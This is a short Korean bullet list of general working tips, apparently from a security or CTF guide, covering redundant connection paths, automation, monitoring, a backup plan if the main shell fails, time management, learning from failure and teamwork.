- **다중 경로**: 하나의 연결이 실패해도 대안 경로 확보
- **자동화**: 자주 발생하는 문제는 스크립트로 자동화
- **모니터링**: 연결 상태를 지속적으로 모니터링
- **백업 계획**: 메인 쉘 실패시 즉시 사용할 백업 방법 준비
- **시간 관리**: 문제 해결에 너무 많은 시간 소모하지 않기
- **학습 태도**: 실패한 시도도 학습 기회로 활용
- **팀워크**: 동료들과 문제 해결 경험 공유
